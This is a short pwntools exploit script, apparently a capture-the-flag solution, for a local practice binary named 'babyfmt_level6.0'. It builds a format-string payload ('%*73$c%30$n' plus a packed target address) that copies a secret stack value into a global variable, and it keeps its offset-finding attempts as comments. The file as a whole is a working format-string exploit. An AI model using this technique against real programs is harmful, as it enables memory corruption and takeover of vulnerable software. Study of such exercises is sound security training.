from pwn import *

context(arch="amd64", os="linux", log_level="info")

io = process("./babyfmt_level6.0")

#payload = b'A' * 2 +  b'B' * 8 + b".%p" * 28
# payload = b'A' * 2 + b'%73$x'
# offset:28 pad:2 secret offset:73
payload = b"%*73$c%30$naaaaaaa" + p64(0x404128)

io.recvuntil(b"Send your data!")
io.send(payload)

io.interactive()
